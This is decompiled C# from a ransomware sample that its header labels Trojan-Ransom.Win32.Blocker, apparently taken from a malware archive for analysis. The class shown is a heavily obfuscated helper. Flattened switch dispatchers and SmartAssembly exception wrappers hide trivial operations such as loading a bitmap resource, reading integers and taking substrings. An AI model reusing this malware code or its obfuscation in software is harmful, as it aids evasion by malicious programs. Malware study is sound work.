// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႳႤ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using My;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;

namespace Ⴈ
{
  internal sealed class ႳႤ
  {
    public static Bitmap Ⴅ(string Ⴃ)
    {
      int num1;
      Stream stream;
      Bitmap bitmap1;
      int num2;
      Bitmap bitmap2;
      try
      {
        try
        {
          try
          {
            num1 = 5;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 1:
                  num1 = stream == null ? 3 : 4;
                  continue;
                case 2:
                  num1 = 0;
                  continue;
                case 3:
                  goto label_6;
                case 4:
                  goto label_5;
                case 6:
                  goto label_9;
                default:
                  stream = Win32.Ⴜ(SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴐ(673, 713), SendingReportFeedbackEventArgs1.Ⴄ(MyComputer.Ⴗ(834542724, 6), Ⴃ, MyComputer.Ⴗ(834542974, 0), 353, 349), 662, 760);
                  goto case 2;
              }
            }
label_5:
            Bitmap bitmap3 = new Bitmap(stream);
            goto label_7;
label_6:
            bitmap3 = (Bitmap) null;
label_7:
            bitmap1 = bitmap3;
          }
          catch
          {
            bitmap1 = (Bitmap) null;
          }
label_9:
          num2 = 4;
          switch (num2)
          {
            case 3:
              break;
            default:
              bitmap2 = bitmap1;
              break;
          }
        }
        catch (Exception ex)
        {
          Stream o1 = stream;
          Bitmap o2 = bitmap1;
          string o3 = Ⴃ;
          SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
        switch (3)
        {
          default:
            return bitmap2;
        }
      }
      catch (Exception ex)
      {
        Stream o1 = stream;
        Bitmap o2 = bitmap1;
        Bitmap o3 = bitmap2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num2;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num3;
        string o7 = Ⴃ;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
        throw;
      }
    }

    public ႳႤ()
    {
      try
      {
      }
      catch (Exception ex)
      {
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException1(ex, (object) this);
        throw;
      }
    }

    static ႳႤ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static int Ⴈ([In] int obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 88:
            num2 = 3;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 5;
              continue;
            case 2:
            case 3:
            case 6:
              goto label_8;
            case 4:
              num1 = 5;
              continue;
            case 5:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႤ.Ⴈ);
              num1 = 5;
              continue;
          }
        }
label_8:
        return Math.Max(obj0, obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static int Ⴐ([In] ref DateTime obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 78:
            num2 = 0;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
            case 5:
              goto label_8;
            case 1:
            case 4:
              goto label_3;
            case 6:
              num1 = 4;
              continue;
            case 7:
              num1 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႤ.Ⴐ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.Month;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int Ⴀ([In] StackTrace obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 15:
            num2 = 4;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_3;
            case 1:
            case 5:
              num1 = 0;
              continue;
            case 2:
            case 4:
            case 6:
              goto label_8;
            case 7:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႤ.Ⴀ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.FrameCount;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        StackTrace o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int Ⴃ([In] ref Rectangle obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 78:
            num2 = 7;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 2;
              continue;
            case 2:
              goto label_3;
            case 3:
            case 4:
              num1 = 2;
              continue;
            case 6:
            case 7:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႤ.Ⴃ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.Top;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<Rectangle> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string Ⴗ([In] string obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 93:
            num2 = 5;
            break;
          case 94:
            num2 = 1;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 8:
              goto label_10;
            case 2:
            case 3:
            case 5:
              goto label_9;
            case 4:
              goto label_3;
            case 6:
              num1 = 4;
              continue;
            case 7:
              num1 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႤ.Ⴗ);
              num1 = 4;
              continue;
          }
        }
label_9:
        return obj0.Remove(obj1);
label_10:
        return obj0.Substring(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static ulong Ⴍ([In] BinaryReader obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 79:
            num2 = 1;
            break;
          default:
            num2 = 7;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 6:
              goto label_8;
            case 2:
              goto label_3;
            case 3:
            case 7:
              num1 = 2;
              continue;
            case 4:
              num1 = 2;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႤ.Ⴍ);
              num1 = 2;
              continue;
          }
        }
label_8:
        return obj0.ReadUInt64();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        BinaryReader o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        SmartAssembly.SmartExceptionsCore.StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }
  }
}
